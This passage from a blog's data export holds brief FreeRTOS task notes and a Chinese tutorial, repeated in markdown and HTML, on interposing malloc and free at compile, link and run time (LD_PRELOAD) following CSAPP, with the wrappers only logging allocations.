href=\"#tasks-c\" class=\"headerlink\" title=\"tasks.c\"></a>tasks.c</h2><p>tasks.c 主要包括task的结构定义以及用户可以调用的task操作</p>\n<h3 id=\"TCB\"><a href=\"#TCB\" class=\"headerlink\" title=\"TCB\"></a>TCB</h3><p><img style=\"display: block; margin: 0 auto;\" src=\"images/TCB.jpg\" alt><br><em>ListItem  State</em>: task状态(Ready，blocked，suspended，running) \\<br><em>ListItem  Event</em> <br><em>Priority</em> <br><em>pxStack</em> <br>*TaskName</p>\n<h2 id=\"Queue-c\"><a href=\"#Queue-c\" class=\"headerlink\" title=\"Queue.c\"></a>Queue.c</h2><p>用于进程间通信</p>\n<h1 id=\"TASK\"><a href=\"#TASK\" class=\"headerlink\" title=\"TASK\"></a>TASK</h1><h2 id=\"task-functions\"><a href=\"#task-functions\" class=\"headerlink\" title=\"task functions\"></a>task functions</h2><p><code>void ATaskFunction( void *pvParameters );</code></p>\n<h3 id=\"每个task含有单独stack\"><a href=\"#每个task含有单独stack\" class=\"headerlink\" title=\"每个task含有单独stack\"></a>每个task含有单独stack</h3><pre><code>void ATaskFunction( void *pvParameters ) { /* Variables can be declared just as per a normal function.  Each instance of a task created using this example function will have its own copy of the lVariableExample variable.  This would not be true if the variable was declared static – in which case only one copy of the variable would exist, and this copy would be shared by each created instance of the task. (The prefixes added to variable names are described in section 1.5, Data Types and Coding Style Guide.) */ \n\nint32_t lVariableExample = 0; \n\n/* A task will normally be implemented as an infinite loop. */     \n\nfor( ;; ) {/* The code to implement the task functionality will go here. */     \n\n} \n\n/* Should the task implementation ever break out of the above loop, then the task      must be deleted before reaching the end of its implementing function.  The NULL      parameter passed to the vTaskDelete() API function indicates that the task to be      deleted is the calling (this) task.  The convention used to name API functions is      described in section 0, Projects that use a FreeRTOS version older than V9.0.0 \n\n\nvTaskDelete( NULL );</code></pre><h2 id=\"创建-task\"><a href=\"#创建-task\" class=\"headerlink\" title=\"创建 task\"></a>创建 task</h2><pre><code>BaseType_t xTaskCreate( TaskFunction_t pvTaskCode, const char * const pcName,    uint16_t usStackDepth,void *pvParameters,UBaseType_t uxPriority,\nTaskHandle_t *pxCreatedTask );</code></pre><p><strong>pvTaskCode</strong>      function name<br><strong>pcName</strong>          only for debug use,freertos does not use it<br><strong>usStackDepth</strong>    specify the size of stack<br><strong>pvParameters</strong>     function parameters</p>\n<h2 id=\"state-transition\"><a href=\"#state-transition\" class=\"headerlink\" title=\"state transition\"></a>state transition</h2><h3 id=\"blocked-state\"><a href=\"#blocked-state\" class=\"headerlink\" title=\"blocked state\"></a>blocked state</h3><p><strong>Tasks可以通过两种类别的event事件进入blocked模式</strong><br><strong>Temporal (time-related) events</strong>：Task等待一段固定的延时，比如taskDelay<br><strong>Synchronization events</strong>：事件起源于其他task或者中断，比如IO等待数据</p>\n<h3 id=\"The-Suspended-State\"><a href=\"#The-Suspended-State\" class=\"headerlink\" title=\"The Suspended State\"></a>The Suspended State</h3><p>suspended state 由应用程序控制（与中断无关）</p>\n<h3 id=\"The-Ready-State\"><a href=\"#The-Ready-State\" class=\"headerlink\" title=\"The Ready State\"></a>The Ready State</h3><h3 id=\"the-Running-State\"><a href=\"#the-Running-State\" class=\"headerlink\" title=\"the Running State\"></a>the Running State</h3><p><img src=\"./images/state_transition.jpg\" alt=\"avatar\"></p>\n<h3 id=\"以下两个函数会将当前任务放到blocked列表中\"><a href=\"#以下两个函数会将当前任务放到blocked列表中\" class=\"headerlink\" title=\"以下两个函数会将当前任务放到blocked列表中\"></a>以下两个函数会将当前任务放到blocked列表中</h3><p><code>vTaskDelayUntil()</code>   : run task at a fixed frequency<br><code>vTaskDelay().</code></p>\n<h2 id=\"idle-task\"><a href=\"#idle-task\" class=\"headerlink\" title=\"idle task\"></a>idle task</h2><h3 id=\"当scheduler启动时，会启动idle-task\"><a href=\"#当scheduler启动时，会启动idle-task\" class=\"headerlink\" title=\"当scheduler启动时，会启动idle task\"></a>当scheduler启动时，会启动idle task</h3><p><code>vTaskStartScheduler()</code></p>\n<h3 id=\"Idle-task-负责清理被删除的task\"><a href=\"#Idle-task-负责清理被删除的task\" class=\"headerlink\" title=\"Idle task 负责清理被删除的task\"></a>Idle task 负责清理被删除的task</h3><h3 id=\"Idle-task-hook\"><a href=\"#Idle-task-hook\" class=\"headerlink\" title=\"Idle task hook\"></a>Idle task hook</h3><p>用户可以定义idle task的应用程序，一般用作低功耗模式<br><strong><em>priority</em></strong> alwasy 0</p>\n<p><strong>configIDLE_SHOULD_YIELD</strong> </p>\n<h2 id=\"Scheduling-Algorithms\"><a href=\"#Scheduling-Algorithms\" class=\"headerlink\" title=\"Scheduling Algorithms\"></a>Scheduling Algorithms</h2><h3 id=\"Round-Robin-Scheduling\"><a href=\"#Round-Robin-Scheduling\" class=\"headerlink\" title=\"Round Robin Scheduling\"></a>Round Robin Scheduling</h3><p>Fixed Priority <strong>Pre-emptive Scheduling</strong> with Time Slicing<br>configUSE_PREEMPTION =1 <br>configUSE_TIME_SLICING =1 <br><strong>pre-emptive:</strong> pre-emptive the lower priority task at each end of a time slice</p>\n<h3 id=\"Co-operative-Scheduling\"><a href=\"#Co-operative-Scheduling\" class=\"headerlink\" title=\"Co-operative Scheduling\"></a>Co-operative Scheduling</h3><p><code>configUSE_PREEMPTION =0</code><br><code>configUSE_TIME_SLICING = Any Value</code></p>\n<h1 id=\"scheduler\"><a href=\"#scheduler\" class=\"headerlink\" title=\"scheduler\"></a>scheduler</h1>"},{"title":"Library Interpostion","date":"2019-11-17T08:00:00.000Z","catalog":true,"subtitle":null,"header-img":null,"top":false,"_content":"# Library Interposition\n最近在看CSAPP的第七章Linking，其中提到对库函数调用的修改（library interposition),特意记录下来与大家分享，并让自己加深巩固理解。\n首先，一共有三种interpostion的方法，分别是在编译阶段，链接阶段和运行阶段实现对调用函数的修改，他们之间的不同可以用下面这张表格来表示\n\n|注入时机|注入需要\n|:--:|:--:\n|编译时|文件源代码\n|链接时|可重定位目标文件\n|运行时|可执行目标文件\n\n## 编译时注入\n编译时注入需要文件的源代码，这里引用csapp里面的代码,我们运行的代码为int.c,在没有注入的情况下代码里调用libc.so中的malloc和free函数，文件mymalloc.c里面编写的时我们注入使用到的malloc和free函数，并在我们自己编写的malloc.h里面声明。\n编译时，我们首先编译mymalloc.c成可重定位目标文件，然后将可重定位目标文件mymalloc.o和int.c编译生成最后的可执行文件。命令如下：\n```\ngcc -DCOMPILETIME -c mymalloc.c\ngcc -I. -o intc int.c mymalloc.o \n```\n第一行中-c代表生成可重定位目标文件，-DCOMPILETIME对应mymalloc.c中的#ifdef COMPILETIME。第二行中的-I.是关键，它告诉编译器在预编译阶段先从\".\"目录中寻找malloc.h，然后再去系统目录下寻找。所以这导致int.c中的include malloc.c为我们定义的malloc.h。这样的话，malloc和free函数就在malloc.h中被替换成了mymalloc和myfree函数。\n因为-I是在预编译阶段对malloc.h进行偷梁换柱，所以必须需要源文件的源代码才能使得注入成功。\n```\n//int.c\n#include <stdio.h>\n#include <malloc.h>\n\nint main(){\n    \n    int *p=malloc(32);\n    printf(\"complete task\\n\");\n    free(p);\n    return 0;\n}\n```\n```\n//malloc.h\n#define malloc(size) mymalloc(size)\n#define free(ptr) myfree(ptr)\n\nvoid *mymalloc(size_t size);\nvoid myfree(void *ptr);\n```\n```\n//mymalloc.c\n#ifdef COMPILETIME\n#include <stdio.h>\n#include <malloc.h>\n\n//malloc wrapper function \n\nvoid *mymalloc(size_t size){\n    void *ptr = malloc(size);\n    printf(\"malloc(%d)=%p\\n\",(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid myfree(void *ptr){\n    free(ptr);\n    printf(\"free(%p)\\n\",ptr);\n}\n#endif\n```\n运行./intc，可以看到结果如下：\n```\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -DCOMPILETIME -c mymalloc.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -I. -o int int.c mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./int \nmalloc(32)=0x5612ed48b260\ncomplete task\nfree(0x5612ed48b260)\n```\n## 链接时注入\n与编译时注入不同，链接时注入发生在链接阶段，链接阶段是对两个可重定位目标文件进行链接，可以对符号进行重定位。在注入前，我们需要准备如下的mymalloc.c文件并对它进行编译成可重定位文件。里面的函数定义与链接器的命令有关。编译命令如下：\n```\ngcc -DLINKTIME -c mymalloc.c\ngcc -c int.c\n```\n```\n//mymalloc.c\n#ifdef LINKTIME\n#include <stdio.h>\n//#include <malloc.h>\nvoid *__real_malloc(size_t size);\nvoid __real_free(void *ptr);\n//malloc wrapper function \n\nvoid *__wrap_malloc(size_t size){\n    void *ptr = __real_malloc(size);\n    printf(\"malloc(%d)=%p\\n\",(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid __wrap_free(void *ptr){\n    __real_free(ptr);\n    printf(\"free(%p)\\n\",ptr);\n}\n#endif\n```\n当我们获得两个可重定位目标文件后，然后就是链接器的工作了。我们从命令上来分析链接器如何完成注入，命令如下：\n```\ngcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \n\n```\n-Wl告诉编译器将后面的参数传给链接器，--wrap参数会将符号f解析为__wrap_f，而将__real_f解析成f,在我们的命令里就是会把malloc解析成__wrap_malloc，而__real_malloc则会被解析成malloc（就是libc里面的malloc函数）这样一来，就完成了malloc函数的注入，free也是同样的道理。最后运行的结果如下。\n```\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -DLINKTIME -c mymalloc.c\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -c int.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./intl \nmalloc(32)=0x55cb46bac260\ncomplete task\nfree(0x55cb46bac260)\n```\n## 运行时注入\n由于编译时注入和链接时注入分别需要源文件的源代码和源文件的可重定位目标文件，在现实中应用的场景不多，而运行时注入只需要源文件的可执行文件即可完成注入。这种机制的实现得益于动态链接器的一个系统变量LD_PRELOAD,程序在寻找动态链接库之前，会先到这个变量定义的路径中去寻找，然后再去系统定义的路径中去寻找动态链接库。mymalloc.c文件如下：\n```\n//mymalloc.c\n#ifdef RUNTIME\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <dlfcn.h>\n\n/* malloc wrapper function */\nvoid *malloc(size_t size)\n{\n    void *(*mallocp)(size_t size);\n    char *error;\n    static __thread int print_times = 0;\n    print_times++;\n    \n    mallocp = dlsym(RTLD_NEXT, \"malloc\"); /* Get address of libc malloc */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    char *ptr = mallocp(size); /* Call libc malloc */\n    if (print_times == 1)\n    {\n        printf(\"malloc(%d) = %p\\n\", (int)size, ptr);\n    }\n    return ptr;\n}\n\n/* free wrapper function */\nvoid free(void *ptr)\n{\n    void (*freep)(void *) = NULL;\n    char *error;\n\n    if (!ptr)\n        return;\n\n    freep = dlsym(RTLD_NEXT, \"free\"); /* Get address of libc free */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    freep(ptr); /* Call libc free */\n    printf(\"free(%p)\\n\", ptr);\n}\n#endif\n/* $end interposer */\n```\n这里，和csapp里面的源代码有点不同，不同之处在于静态变量print_times，在csapp里面没有这个变量。由于新的malloc函数中调用了printf函数，而printf函数在实现时可能也调用了malloc函数，这会导致两个函数不断的互相调用对方，最后导致栈溢出，报出segmentation fault。引入print_times后，由于是静态变量，只有当第一次调用malloc是，才会调用printf函数，避免了互相调用的死循环。\n首先，我们编译动态库和可执行文件：\n```\ngcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl\ngcc -o intr int.c\n```\n然后在运行代码时指定LD_PRELOAD变量并运行可执行文件./intr\n```\nLD_PRELOAD=\"./mymalloc.so\"  ./intr \n```\n最后发现运行结果如下：\n```\nsaxon@ubuntu:~/Desktop/library_interposition$ LD_PRELOAD=\"./mymalloc.so\"  ./intr \nmalloc(32) = 0x5583182ab260\ncomplete task\nfree(0x5583182ab260)\n```\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/libraryposition.md","raw":"---\ntitle: Library Interpostion\ndate: 2019.11.17\ncatalog: true\nsubtitle: \nheader-img: \ntop: false\ntags: \ncategories: CSAPP \n---\n# Library Interposition\n最近在看CSAPP的第七章Linking，其中提到对库函数调用的修改（library interposition),特意记录下来与大家分享，并让自己加深巩固理解。\n首先，一共有三种interpostion的方法，分别是在编译阶段，链接阶段和运行阶段实现对调用函数的修改，他们之间的不同可以用下面这张表格来表示\n\n|注入时机|注入需要\n|:--:|:--:\n|编译时|文件源代码\n|链接时|可重定位目标文件\n|运行时|可执行目标文件\n\n## 编译时注入\n编译时注入需要文件的源代码，这里引用csapp里面的代码,我们运行的代码为int.c,在没有注入的情况下代码里调用libc.so中的malloc和free函数，文件mymalloc.c里面编写的时我们注入使用到的malloc和free函数，并在我们自己编写的malloc.h里面声明。\n编译时，我们首先编译mymalloc.c成可重定位目标文件，然后将可重定位目标文件mymalloc.o和int.c编译生成最后的可执行文件。命令如下：\n```\ngcc -DCOMPILETIME -c mymalloc.c\ngcc -I. -o intc int.c mymalloc.o \n```\n第一行中-c代表生成可重定位目标文件，-DCOMPILETIME对应mymalloc.c中的#ifdef COMPILETIME。第二行中的-I.是关键，它告诉编译器在预编译阶段先从\".\"目录中寻找malloc.h，然后再去系统目录下寻找。所以这导致int.c中的include malloc.c为我们定义的malloc.h。这样的话，malloc和free函数就在malloc.h中被替换成了mymalloc和myfree函数。\n因为-I是在预编译阶段对malloc.h进行偷梁换柱，所以必须需要源文件的源代码才能使得注入成功。\n```\n//int.c\n#include <stdio.h>\n#include <malloc.h>\n\nint main(){\n    \n    int *p=malloc(32);\n    printf(\"complete task\\n\");\n    free(p);\n    return 0;\n}\n```\n```\n//malloc.h\n#define malloc(size) mymalloc(size)\n#define free(ptr) myfree(ptr)\n\nvoid *mymalloc(size_t size);\nvoid myfree(void *ptr);\n```\n```\n//mymalloc.c\n#ifdef COMPILETIME\n#include <stdio.h>\n#include <malloc.h>\n\n//malloc wrapper function \n\nvoid *mymalloc(size_t size){\n    void *ptr = malloc(size);\n    printf(\"malloc(%d)=%p\\n\",(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid myfree(void *ptr){\n    free(ptr);\n    printf(\"free(%p)\\n\",ptr);\n}\n#endif\n```\n运行./intc，可以看到结果如下：\n```\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -DCOMPILETIME -c mymalloc.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -I. -o int int.c mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./int \nmalloc(32)=0x5612ed48b260\ncomplete task\nfree(0x5612ed48b260)\n```\n## 链接时注入\n与编译时注入不同，链接时注入发生在链接阶段，链接阶段是对两个可重定位目标文件进行链接，可以对符号进行重定位。在注入前，我们需要准备如下的mymalloc.c文件并对它进行编译成可重定位文件。里面的函数定义与链接器的命令有关。编译命令如下：\n```\ngcc -DLINKTIME -c mymalloc.c\ngcc -c int.c\n```\n```\n//mymalloc.c\n#ifdef LINKTIME\n#include <stdio.h>\n//#include <malloc.h>\nvoid *__real_malloc(size_t size);\nvoid __real_free(void *ptr);\n//malloc wrapper function \n\nvoid *__wrap_malloc(size_t size){\n    void *ptr = __real_malloc(size);\n    printf(\"malloc(%d)=%p\\n\",(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid __wrap_free(void *ptr){\n    __real_free(ptr);\n    printf(\"free(%p)\\n\",ptr);\n}\n#endif\n```\n当我们获得两个可重定位目标文件后，然后就是链接器的工作了。我们从命令上来分析链接器如何完成注入，命令如下：\n```\ngcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \n\n```\n-Wl告诉编译器将后面的参数传给链接器，--wrap参数会将符号f解析为__wrap_f，而将__real_f解析成f,在我们的命令里就是会把malloc解析成__wrap_malloc，而__real_malloc则会被解析成malloc（就是libc里面的malloc函数）这样一来，就完成了malloc函数的注入，free也是同样的道理。最后运行的结果如下。\n```\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -DLINKTIME -c mymalloc.c\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -c int.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./intl \nmalloc(32)=0x55cb46bac260\ncomplete task\nfree(0x55cb46bac260)\n```\n## 运行时注入\n由于编译时注入和链接时注入分别需要源文件的源代码和源文件的可重定位目标文件，在现实中应用的场景不多，而运行时注入只需要源文件的可执行文件即可完成注入。这种机制的实现得益于动态链接器的一个系统变量LD_PRELOAD,程序在寻找动态链接库之前，会先到这个变量定义的路径中去寻找，然后再去系统定义的路径中去寻找动态链接库。mymalloc.c文件如下：\n```\n//mymalloc.c\n#ifdef RUNTIME\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <dlfcn.h>\n\n/* malloc wrapper function */\nvoid *malloc(size_t size)\n{\n    void *(*mallocp)(size_t size);\n    char *error;\n    static __thread int print_times = 0;\n    print_times++;\n    \n    mallocp = dlsym(RTLD_NEXT, \"malloc\"); /* Get address of libc malloc */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    char *ptr = mallocp(size); /* Call libc malloc */\n    if (print_times == 1)\n    {\n        printf(\"malloc(%d) = %p\\n\", (int)size, ptr);\n    }\n    return ptr;\n}\n\n/* free wrapper function */\nvoid free(void *ptr)\n{\n    void (*freep)(void *) = NULL;\n    char *error;\n\n    if (!ptr)\n        return;\n\n    freep = dlsym(RTLD_NEXT, \"free\"); /* Get address of libc free */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    freep(ptr); /* Call libc free */\n    printf(\"free(%p)\\n\", ptr);\n}\n#endif\n/* $end interposer */\n```\n这里，和csapp里面的源代码有点不同，不同之处在于静态变量print_times，在csapp里面没有这个变量。由于新的malloc函数中调用了printf函数，而printf函数在实现时可能也调用了malloc函数，这会导致两个函数不断的互相调用对方，最后导致栈溢出，报出segmentation fault。引入print_times后，由于是静态变量，只有当第一次调用malloc是，才会调用printf函数，避免了互相调用的死循环。\n首先，我们编译动态库和可执行文件：\n```\ngcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl\ngcc -o intr int.c\n```\n然后在运行代码时指定LD_PRELOAD变量并运行可执行文件./intr\n```\nLD_PRELOAD=\"./mymalloc.so\"  ./intr \n```\n最后发现运行结果如下：\n```\nsaxon@ubuntu:~/Desktop/library_interposition$ LD_PRELOAD=\"./mymalloc.so\"  ./intr \nmalloc(32) = 0x5583182ab260\ncomplete task\nfree(0x5583182ab260)\n```\n\n\n\n\n\n\n\n\n\n\n\n","slug":"libraryposition","published":1,"updated":"2020-10-04T05:12:41.350Z","_id":"ckfq5d2zu0003dljxvsgmcgdm","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Library-Interposition\"><a href=\"#Library-Interposition\" class=\"headerlink\" title=\"Library Interposition\"></a>Library Interposition</h1><p>最近在看CSAPP的第七章Linking，其中提到对库函数调用的修改（library interposition),特意记录下来与大家分享，并让自己加深巩固理解。<br>首先，一共有三种interpostion的方法，分别是在编译阶段，链接阶段和运行阶段实现对调用函数的修改，他们之间的不同可以用下面这张表格来表示</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">注入时机</th>\n<th align=\"center\">注入需要</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">编译时</td>\n<td align=\"center\">文件源代码</td>\n</tr>\n<tr>\n<td align=\"center\">链接时</td>\n<td align=\"center\">可重定位目标文件</td>\n</tr>\n<tr>\n<td align=\"center\">运行时</td>\n<td align=\"center\">可执行目标文件</td>\n</tr>\n</tbody></table>\n<h2 id=\"编译时注入\"><a href=\"#编译时注入\" class=\"headerlink\" title=\"编译时注入\"></a>编译时注入</h2><p>编译时注入需要文件的源代码，这里引用csapp里面的代码,我们运行的代码为int.c,在没有注入的情况下代码里调用libc.so中的malloc和free函数，文件mymalloc.c里面编写的时我们注入使用到的malloc和free函数，并在我们自己编写的malloc.h里面声明。<br>编译时，我们首先编译mymalloc.c成可重定位目标文件，然后将可重定位目标文件mymalloc.o和int.c编译生成最后的可执行文件。命令如下：</p>\n<pre><code>gcc -DCOMPILETIME -c mymalloc.c\ngcc -I. -o intc int.c mymalloc.o </code></pre><p>第一行中-c代表生成可重定位目标文件，-DCOMPILETIME对应mymalloc.c中的#ifdef COMPILETIME。第二行中的-I.是关键，它告诉编译器在预编译阶段先从”.”目录中寻找malloc.h，然后再去系统目录下寻找。所以这导致int.c中的include malloc.c为我们定义的malloc.h。这样的话，malloc和free函数就在malloc.h中被替换成了mymalloc和myfree函数。<br>因为-I是在预编译阶段对malloc.h进行偷梁换柱，所以必须需要源文件的源代码才能使得注入成功。</p>\n<pre><code>//int.c\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\nint main(){\n\n    int *p=malloc(32);\n    printf(&quot;complete task\\n&quot;);\n    free(p);\n    return 0;\n}</code></pre><pre><code>//malloc.h\n#define malloc(size) mymalloc(size)\n#define free(ptr) myfree(ptr)\n\nvoid *mymalloc(size_t size);\nvoid myfree(void *ptr);</code></pre><pre><code>//mymalloc.c\n#ifdef COMPILETIME\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\n//malloc wrapper function \n\nvoid *mymalloc(size_t size){\n    void *ptr = malloc(size);\n    printf(&quot;malloc(%d)=%p\\n&quot;,(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid myfree(void *ptr){\n    free(ptr);\n    printf(&quot;free(%p)\\n&quot;,ptr);\n}\n#endif</code></pre><p>运行./intc，可以看到结果如下：</p>\n<pre><code>saxon@ubuntu:~/Desktop/library_interposition$ gcc -DCOMPILETIME -c mymalloc.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -I. -o int int.c mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./int \nmalloc(32)=0x5612ed48b260\ncomplete task\nfree(0x5612ed48b260)</code></pre><h2 id=\"链接时注入\"><a href=\"#链接时注入\" class=\"headerlink\" title=\"链接时注入\"></a>链接时注入</h2><p>与编译时注入不同，链接时注入发生在链接阶段，链接阶段是对两个可重定位目标文件进行链接，可以对符号进行重定位。在注入前，我们需要准备如下的mymalloc.c文件并对它进行编译成可重定位文件。里面的函数定义与链接器的命令有关。编译命令如下：</p>\n<pre><code>gcc -DLINKTIME -c mymalloc.c\ngcc -c int.c</code></pre><pre><code>//mymalloc.c\n#ifdef LINKTIME\n#include &lt;stdio.h&gt;\n//#include &lt;malloc.h&gt;\nvoid *__real_malloc(size_t size);\nvoid __real_free(void *ptr);\n//malloc wrapper function \n\nvoid *__wrap_malloc(size_t size){\n    void *ptr = __real_malloc(size);\n    printf(&quot;malloc(%d)=%p\\n&quot;,(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid __wrap_free(void *ptr){\n    __real_free(ptr);\n    printf(&quot;free(%p)\\n&quot;,ptr);\n}\n#endif</code></pre><p>当我们获得两个可重定位目标文件后，然后就是链接器的工作了。我们从命令上来分析链接器如何完成注入，命令如下：</p>\n<pre><code>gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \n</code></pre><p>-Wl告诉编译器将后面的参数传给链接器，–wrap参数会将符号f解析为<strong>wrap_f，而将</strong>real_f解析成f,在我们的命令里就是会把malloc解析成<strong>wrap_malloc，而</strong>real_malloc则会被解析成malloc（就是libc里面的malloc函数）这样一来，就完成了malloc函数的注入，free也是同样的道理。最后运行的结果如下。</p>\n<pre><code>saxon@ubuntu:~/Desktop/library_interposition$ gcc -DLINKTIME -c mymalloc.c\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -c int.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./intl \nmalloc(32)=0x55cb46bac260\ncomplete task\nfree(0x55cb46bac260)</code></pre><h2 id=\"运行时注入\"><a href=\"#运行时注入\" class=\"headerlink\" title=\"运行时注入\"></a>运行时注入</h2><p>由于编译时注入和链接时注入分别需要源文件的源代码和源文件的可重定位目标文件，在现实中应用的场景不多，而运行时注入只需要源文件的可执行文件即可完成注入。这种机制的实现得益于动态链接器的一个系统变量LD_PRELOAD,程序在寻找动态链接库之前，会先到这个变量定义的路径中去寻找，然后再去系统定义的路径中去寻找动态链接库。mymalloc.c文件如下：</p>\n<pre><code>//mymalloc.c\n#ifdef RUNTIME\n#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;dlfcn.h&gt;\n\n/* malloc wrapper function */\nvoid *malloc(size_t size)\n{\n    void *(*mallocp)(size_t size);\n    char *error;\n    static __thread int print_times = 0;\n    print_times++;\n\n    mallocp = dlsym(RTLD_NEXT, &quot;malloc&quot;); /* Get address of libc malloc */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    char *ptr = mallocp(size); /* Call libc malloc */\n    if (print_times == 1)\n    {\n        printf(&quot;malloc(%d) = %p\\n&quot;, (int)size, ptr);\n    }\n    return ptr;\n}\n\n/* free wrapper function */\nvoid free(void *ptr)\n{\n    void (*freep)(void *) = NULL;\n    char *error;\n\n    if (!ptr)\n        return;\n\n    freep = dlsym(RTLD_NEXT, &quot;free&quot;); /* Get address of libc free */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    freep(ptr); /* Call libc free */\n    printf(&quot;free(%p)\\n&quot;, ptr);\n}\n#endif\n/* $end interposer */</code></pre><p>这里，和csapp里面的源代码有点不同，不同之处在于静态变量print_times，在csapp里面没有这个变量。由于新的malloc函数中调用了printf函数，而printf函数在实现时可能也调用了malloc函数，这会导致两个函数不断的互相调用对方，最后导致栈溢出，报出segmentation fault。引入print_times后，由于是静态变量，只有当第一次调用malloc是，才会调用printf函数，避免了互相调用的死循环。<br>首先，我们编译动态库和可执行文件：</p>\n<pre><code>gcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl\ngcc -o intr int.c</code></pre><p>然后在运行代码时指定LD_PRELOAD变量并运行可执行文件./intr</p>\n<pre><code>LD_PRELOAD=&quot;./mymalloc.so&quot;  ./intr </code></pre><p>最后发现运行结果如下：</p>\n<pre><code>saxon@ubuntu:~/Desktop/library_interposition$ LD_PRELOAD=&quot;./mymalloc.so&quot;  ./intr \nmalloc(32) = 0x5583182ab260\ncomplete task\nfree(0x5583182ab260)</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Library-Interposition\"><a href=\"#Library-Interposition\" class=\"headerlink\" title=\"Library Interposition\"></a>Library Interposition</h1><p>最近在看CSAPP的第七章Linking，其中提到对库函数调用的修改（library interposition),特意记录下来与大家分享，并让自己加深巩固理解。<br>首先，一共有三种interpostion的方法，分别是在编译阶段，链接阶段和运行阶段实现对调用函数的修改，他们之间的不同可以用下面这张表格来表示</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">注入时机</th>\n<th align=\"center\">注入需要</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">编译时</td>\n<td align=\"center\">文件源代码</td>\n</tr>\n<tr>\n<td align=\"center\">链接时</td>\n<td align=\"center\">可重定位目标文件</td>\n</tr>\n<tr>\n<td align=\"center\">运行时</td>\n<td align=\"center\">可执行目标文件</td>\n</tr>\n</tbody></table>\n<h2 id=\"编译时注入\"><a href=\"#编译时注入\" class=\"headerlink\" title=\"编译时注入\"></a>编译时注入</h2><p>编译时注入需要文件的源代码，这里引用csapp里面的代码,我们运行的代码为int.c,在没有注入的情况下代码里调用libc.so中的malloc和free函数，文件mymalloc.c里面编写的时我们注入使用到的malloc和free函数，并在我们自己编写的malloc.h里面声明。<br>编译时，我们首先编译mymalloc.c成可重定位目标文件，然后将可重定位目标文件mymalloc.o和int.c编译生成最后的可执行文件。命令如下：</p>\n<pre><code>gcc -DCOMPILETIME -c mymalloc.c\ngcc -I. -o intc int.c mymalloc.o </code></pre><p>第一行中-c代表生成可重定位目标文件，-DCOMPILETIME对应mymalloc.c中的#ifdef COMPILETIME。第二行中的-I.是关键，它告诉编译器在预编译阶段先从”.”目录中寻找malloc.h，然后再去系统目录下寻找。所以这导致int.c中的include malloc.c为我们定义的malloc.h。这样的话，malloc和free函数就在malloc.h中被替换成了mymalloc和myfree函数。<br>因为-I是在预编译阶段对malloc.h进行偷梁换柱，所以必须需要源文件的源代码才能使得注入成功。</p>\n<pre><code>//int.c\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\nint main(){\n\n    int *p=malloc(32);\n    printf(&quot;complete task\\n&quot;);\n    free(p);\n    return 0;\n}</code></pre><pre><code>//malloc.h\n#define malloc(size) mymalloc(size)\n#define free(ptr) myfree(ptr)\n\nvoid 